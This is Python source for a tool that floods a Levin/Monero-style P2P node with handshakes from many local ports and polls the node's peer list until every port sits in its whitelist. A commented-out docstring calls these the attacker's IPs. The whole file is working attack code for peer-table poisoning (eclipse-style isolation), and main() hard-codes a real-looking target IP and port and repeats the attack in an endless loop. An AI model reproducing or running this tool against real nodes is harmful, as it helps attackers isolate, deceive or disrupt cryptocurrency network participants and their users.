import errno 
import logging
from random import random
import time
import socket
import selectors

import levin_sync
import levin_sync.constants
from controller import config
from controller.get_peerlist import async_get_list

'epoll+握手请求顺序控制'

class EpollConn:
    """包装单条连接，使之适用于 epoll 事件循环。"""

    def __init__(self, ip, port, bind_ip, listen_port, index, selector):
        self.ip = ip
        self.port = port
        self.local_ip = bind_ip    # 使用固定IP
        self.listen_port = listen_port  # 监听端口（用于握手包中的my_port）
        self.sent_ok = False
        self.recv_ok = False
        self.err = None
        self._index = index
        self._stage = "connect"
        self._buf = bytearray()
        self.selector = selector
        self.start_time = time.time()
        self._ready_to_send_at = self.start_time + 0.15 * (index // 100)
        self.logger = logging.getLogger(f"node_{ip}_{port}")

        # --- 非阻塞 socket ---
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 允许端口重用
        self.sock.setblocking(False)
        self.sock.settimeout(0)          # epoll 自己做超时
        
        # 设置SO_REUSEPORT以允许与监听器共享端口
        if hasattr(socket, 'SO_REUSEPORT'):
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            self.logger.debug(f"握手程序启用SO_REUSEPORT for port {self.listen_port}")
        else:
            self.logger.error(f"系统不支持SO_REUSEPORT，无法与监听器共享端口 {self.listen_port}")
            raise RuntimeError("握手程序需要SO_REUSEPORT支持才能与监听器并行运行")
        
        # 绑定到指定的监听端口，这样目标节点会向正确的端口发起反ping
        try:
            if self.local_ip:  # 例如 '10.2.8.6'；不要用 EIP
                self.sock.bind((self.local_ip, self.listen_port))
                self.logger.debug(f"握手程序成功绑定 {self.local_ip}:{self.listen_port}")
            else:
                self.sock.bind(('', self.listen_port))
                self.logger.debug(f"握手程序绑定 0.0.0.0:{self.listen_port}")
        except OSError as e:
            self.logger.error(f"握手程序无法绑定到 {self.local_ip}:{self.listen_port}: {e}")
            self.logger.error("这可能是因为监听器未运行或SO_REUSEPORT设置有问题")
            raise RuntimeError(f"握手连接必须绑定到指定端口 {self.listen_port}, 绑定失败: {e}")
        try:
            self.sock.connect((ip, port))
        except BlockingIOError:
            pass                         # 非阻塞连接正常抛出
        except OSError as e:
            if e.errno == errno.EADDRNOTAVAIL:
                # 99：本地地址不可用（多半是 bind_ip 不是本机地址）
                self.logger.warning(f"connect() 触发 EADDRNOTAVAIL: {e}，改用 0.0.0.0:{self.listen_port} 回退重试")

                # 重新创建 socket 并仅绑定端口（让内核挑选正确的本机 IP）
                try:
                    self.sock.close()
                except Exception:
                    pass

                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.sock.setblocking(False)
                self.sock.settimeout(0)
                try:
                    if hasattr(socket, 'SO_REUSEPORT'):
                        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                except OSError as e2:
                    self.logger.warning(f"SO_REUSEPORT 设置失败：{e2}（继续运行）")

                # 关键：只绑定端口，不绑定 IP
                try:
                    self.sock.bind(('', self.listen_port))
                except OSError as bind_err:
                    self.logger.error(f"回退绑定端口 {self.listen_port} 失败: {bind_err}")
                    # 标记连接失败但不抛出异常，让程序继续处理其他连接
                    self.err = f"[bind failed] {bind_err}"
                    return

                # 再次发起非阻塞 connect
                try:
                    self.sock.connect((ip, port))
                except BlockingIOError:
                    pass
                except OSError as connect_err:
                    self.logger.warning(f"回退连接仍然失败: {connect_err}")
                    # 标记连接失败但不抛出异常，让程序继续处理其他连接
                    self.err = f"[connect retry failed] {connect_err}"
                    return
            else:
                # 对于其他类型的OSError，也做类似处理，避免程序崩溃
                self.logger.warning(f"连接出现其他网络错误: {e}")
                self.err = f"[network error] {e}"
                return
        
        # 只有当socket有效时才注册到selector
        if self.err is None:
            try:
                self.selector.register(self.sock, selectors.EVENT_WRITE, self)
            except Exception as reg_err:
                self.logger.error(f"selector注册失败: {reg_err}")
                self.err = f"[selector register failed] {reg_err}"

        # 预生成握手包，发送时直接用（使用listen_port作为my_port）
        # 将int类型的peer_id转换为bytes
        # peer_id_bytes = (11300175395242703804).to_bytes(8, 'little')
        peer_id_bytes=config.addr_peerid_map.get((config.PROBE_NODE[0], listen_port), 0)
        handshake_bucket = levin_sync.Bucket.create_handshake_request(
            my_port=listen_port,
            network_id=config.NETWORK_ID,
            peer_id=peer_id_bytes,
            block_height=levin_sync.constants.BLOCK_HEIGHT
        )
        self._handshake = handshake_bucket.header() + handshake_bucket.payload()

    # ---------- 事件回调 ----------
    def __call__(self, key, mask):
        try:
            if self._stage == "connect" and mask & selectors.EVENT_WRITE:
                # 只有等到对应的时间点才会进入发送阶段, 自然控制批次发送握手包的节奏
                if time.time() >= self._ready_to_send_at:
                    self._stage = "send"

            if self._stage == "send" and mask & selectors.EVENT_WRITE:
                self.sock.sendall(self._handshake)
                self.sent_ok = True
                self._stage = "recv"
                self.selector.modify(self.sock, selectors.EVENT_READ, self)

            if self._stage == "recv" and mask & selectors.EVENT_READ:
                self._handle_recv()

        except Exception as e:
            self.err = f"[index={self._index}] {e}"
            self.close()

    def _handle_recv(self):
        # 1) 把当前能读到的全部放进 _buf
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    raise RuntimeError("Peer closed")
                self._buf += chunk
            except BlockingIOError as e:
                if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                    break   # 缓冲区已空，跳出循环
                raise

        # 2) 够 8 字节就解析一个包头；不够就等下一次事件
        if len(self._buf) >= 8:
            # 检查是否有完整的头部
            if not self._buf.startswith(bytes(levin_sync.constants.LEVIN_SIGNATURE)):
                self._buf.clear()
                raise RuntimeError(f"Invalid signature")

            # 从缓冲区中读取头部
            header_data = self._buf[:8]
            bucket = levin_sync.Bucket.from_buffer(signature=header_data, sock=self.sock, recv_buffer=self._buf)
            if bucket is None:
                # 数据不完整，等待更多数据
                return

            # 检查是否有完整的数据包
            total_size = 33 + bucket.cb.value
            if len(self._buf) < total_size:
                return
            self._buf = self._buf[total_size:]
            # 1007 REQUEST -> 忽略
            if bucket.command == 1001 and \
                bucket.flags == levin_sync.constants.LEVIN_PACKET_RESPONSE:
                self.recv_ok = True
                return self.close()

    def close(self):
        # 只有当socket被正确注册时才尝试注销
        if hasattr(self, 'sock') and hasattr(self.sock, 'fileno') and self.sock.fileno() != -1:
            try:
                self.selector.unregister(self.sock)
            except Exception:
                pass
            try:
                # 优雅关闭socket
                self.sock.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
        try:
            if hasattr(self, 'sock'):
                self.sock.close()
        except Exception:
            pass

def create_connections(ip, port, listen_port_list, selector, bind_ip):
    """创建使用同一IP、多端口的连接实例"""
    conns = []
    logger = logging.getLogger(f"node_{ip}_{port}")
    
    # 遍历监听端口列表
    for idx, listen_port in enumerate(listen_port_list):
        try:
            c = EpollConn(ip, port, bind_ip, listen_port, idx, selector)
            conns.append(c)
        except Exception as e:
            logger.warning(f"创建连接到端口 {listen_port} 失败: {e}")
            # 继续处理其他端口，不让单个端口的失败影响整体进程
            continue
    return conns

def run_event_loop(conns, selector, timeout = 10):
    """运行事件循环处理连接"""
    active_conns = conns[:]
    batch_start_time = time.time()  # 整批开始时间
    TIMEOUT_EVERY_NODE = timeout    # 每个连接的超时时间（包含建立TCP连接、发送握手请求、接收握手响应）
    TIMEOUT_BATCH = timeout + 1     # 整批连接的超时时间

    while active_conns:
        now = time.time()

        # ✅ 批次总超时控制
        if now - batch_start_time > TIMEOUT_BATCH:
            for c in active_conns:
                if c.err is None:
                    c.err = "[batch timeout]"
                c.close()
            break

        # ✅ 单个连接超时控制
        for c in active_conns:
            if (now - c.start_time) > TIMEOUT_EVERY_NODE:
                if not (c.sent_ok and c.recv_ok) and c.err is None:
                    c.err = "[per-conn timeout]"
                c.close()

        # 更新还活跃的连接（排除有错误或socket已关闭的连接）
        active_conns = [c for c in active_conns if hasattr(c, 'sock') and 
                        hasattr(c.sock, 'fileno') and c.sock.fileno() != -1]
        if not active_conns:
            break

        # 建议将 timeout 设置为小值，便于快速响应超时
        events = selector.select(timeout=0.01)
        for key, mask in events:
            callback = key.data
            start = time.time()
            callback(key, mask)
            duration = time.time() - start
            if duration > 0.05:
                callback.logger.warning(f"[slow callback] {callback} took {duration:.4f}s")

'''async def retry_connections(ip, port, p2p_listen_port, existing_conns, selector, start_time):
    """重试连接并确保白名单填充成功。
    
    实现原理：
    可能我们发送了1003响应，但是对方没有处理。比如，1003响应进入到对方的网络缓冲区，
    目标节点还没来得及处理1003响应消息，但是TCP连接意外断开，这个1003消息就被丢弃了。

    提出的保证填充到目标节点的白名单的方式：
    1. 初始握手，与目标节点握手1000次。
    2. 请求对方的白名单，记录没有成功填充到对方白名单中的攻击者IP集合 S，补发集合 S 中的地址的握手请求。
    3. 循环请求对方的白名单 W、补发。
       - 循环停止的条件为：集合 S 中的地址在补发的过程中都在对方的白名单中出现了，
         这样保证了所有的攻击者IP都填充对方的白名单中一次，说明白名单填充成功。
       - 具体的做法是：在补发过程中，将 W 中出现的地址从 S 中删除，直到集合 S 为空。

    发1012个，循环到ping_count >= 1000停止
    """
    logger = logging.getLogger(f"node_{ip}_{port}")
    filled_ip_count = 0
    
    missing_local_ips = set(config.local_ip_list)
    for _ in range(10):
        white_list = await async_get_list(ip, port)
        if not white_list:
            if time.time() - start_time > 90:
                logger.error(f"[{ip}:{port}] whitelist fill fail in 90 seconds")
                break
            else:
                continue
        white_ip_set = set(item.split(":")[0] for item in white_list)
        missing_local_ips -= white_ip_set
        filled_ip_count = len(config.local_ip_list) - len(missing_local_ips)
        logger.info(f"[{ip}:{port}] filled_ip_count = {filled_ip_count}")
        if filled_ip_count >= 1000:
            break
        if time.time() - start_time > 90:
            logger.error(f"[{ip}:{port}] whitelist fill fail in 90 seconds")
            break
        new_conns = create_connections(ip, port, p2p_listen_port, missing_local_ips, selector)
        existing_conns.extend(new_conns)
        run_event_loop(new_conns, selector, 5)
        if time.time() - start_time > 90:
            logger.error(f"[{ip}:{port}] whitelist fill fail in 90 seconds")
            break
    return existing_conns, filled_ip_count'''

async def retry_connections(ip, port, existing_conns, selector, start_time):
    """重试填充，确保所有端口完成握手"""
    logger = logging.getLogger(f"node_{ip}_{port}")
    missing_ports = set(config.LOCAL_P2P_PORT_LIST)

    for _ in range(10):
        white_list = await async_get_list(ip, port)
        if not white_list:
            if time.time() - start_time > 90:
                logger.error(f"[{ip}:{port}] fill fail in 90s")
                break
            continue
        # 解析远端返回的已填充本地端口
        logger.info(f"[{ip}:{port}] 白名单样例: {list(white_list)[:5]}")  # 显示前5个条目
        
        # 过滤出我们的IP地址的条目
        our_public_ip = config.PROBE_NODE[0]
        logger.info(f"[{ip}:{port}] 我们的公网ip: {our_public_ip}")
        our_entries = [item for item in white_list if item.startswith(our_public_ip)]
        logger.info(f"[{ip}:{port}] 我们IP的条目: {our_entries}")
        
        fill_set = set()
        try:
            fill_set = set(int(item.split(":")[1]) for item in our_entries)
        except (ValueError, IndexError) as e:
            logger.warning(f"[{ip}:{port}] 解析端口失败: {e}")
        
        missing_ports -= fill_set
        filled = len(config.LOCAL_P2P_PORT_LIST) - len(missing_ports)
        logger.info(f"[{ip}:{port}] filled={filled}, found_ports={fill_set}")
        if filled >= len(config.LOCAL_P2P_PORT_LIST): break
        if time.time() - start_time > 90:
            logger.error(f"[{ip}:{port}] fill fail in 90s")
            break
        new_conns = create_connections(ip, port, list(missing_ports), selector, config.BIND_IP)
        existing_conns.extend(new_conns)
        run_event_loop(new_conns, selector, timeout=5)
    return existing_conns, len(config.LOCAL_P2P_PORT_LIST) - len(missing_ports)

def collect_results(ip, port, start_time, conns):
    """收集并记录连接结果"""
    logger = logging.getLogger(f"node_{ip}_{port}")
    send_success = recv_success = 0
    errors = {}
    sockets = []

    for c in conns:
        sockets.append(c.sock)
        if c.sent_ok:
            send_success += 1
        if c.recv_ok:
            recv_success += 1
        if c.err:
            errors[c.listen_port] = {
                "error_type": "Exception",
                "error_detail": c.err
            }

    end_time = time.time()
    # if not errors:
    #     errors = {'error_type': None, 'error_detail': None}
    
    logger.info(
        f"[{ip}:{port}] start_time = {round(start_time, 1)}, end_time = {round(end_time, 1)}, total_time = {round(end_time - start_time, 1)}, send_success = {send_success}, recv_success = {recv_success}" 
        f", errors: {errors}" if errors else "")

'''async def fill_node(ip: str, port: int, p2p_listen_port: int):
    """执行节点白名单填充的主要逻辑"""
    start_time = time.time()
    selector = selectors.DefaultSelector()

    all_conns = create_connections(ip, port, p2p_listen_port, config.local_ip_list, selector)
    run_event_loop(all_conns, selector, 10)

    all_conns, filled_ip_count = await retry_connections(ip, port, p2p_listen_port, all_conns, selector, start_time)

    collect_results(ip, port, start_time, all_conns)
    logger = logging.getLogger(f"node_{ip}_{port}")
    if filled_ip_count >= 1000:
        logger.info(f"[{ip}:{port}] 本地白名单填充成功")
    else:
        logger.info(f"[{ip}:{port}] 本地白名单填充失败")
    return (filled_ip_count >= 1000)'''

async def fill_node(ip: str, port: int):
    """执行完整白名单填充流程"""
    start = time.time()
    selector = selectors.DefaultSelector()
    conns = []
    
    try:
        # 初始一轮
        conns = create_connections(ip, port, config.LOCAL_P2P_PORT_LIST,
                                    selector, config.BIND_IP)
        run_event_loop(conns, selector, timeout=10)
        # 重试直到全部端口填充
        conns, total = await retry_connections(
            ip, port, conns, selector, start)
        collect_results(ip, port, start, conns)
        logger = logging.getLogger(f"node_{ip}_{port}")
        if total >= len(config.LOCAL_P2P_PORT_LIST):
            logger.info(f"[{ip}:{port}] 完成所有端口填充")
            return True
        else:
            logger.error(f"[{ip}:{port}] 仅填充 {total} 个端口")
            return False
    finally:
        # 确保所有连接都被关闭
        for conn in conns:
            conn.close()
        # 关闭selector
        try:
            selector.close()
        except Exception:
            pass

async def main():
    """主函数，用于测试"""
    from datetime import datetime
    import asyncio
    #config.configure_node_logger()
    ip = "49.233.169.195"  #目标ip  
    port = 28285          #目标端口
    
    #listen_port = config.LOCAL_P2P_LISTEN_PORT
    #logger = logging.getLogger(f"node_{ip}_{port}")

    # 配置并获取这个节点专属的 Logger
    logger = config.configure_node_logger(ip, port)

    round_num = 0

    while True:
        round_num += 1
        with open(f"node_listener_{config.BIND_IP}.log", 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"{timestamp} Start round {round_num}\n")

        logger.info(f"开始第 {round_num} 轮探测")
        result = await fill_node(ip, port)
        print(result)
        logger.info(f"第 {round_num} 轮探测结束")
        await asyncio.sleep(5)

if __name__ == "__main__":
    import multiprocessing
    import asyncio
    multiprocessing.freeze_support()
    asyncio.run(main())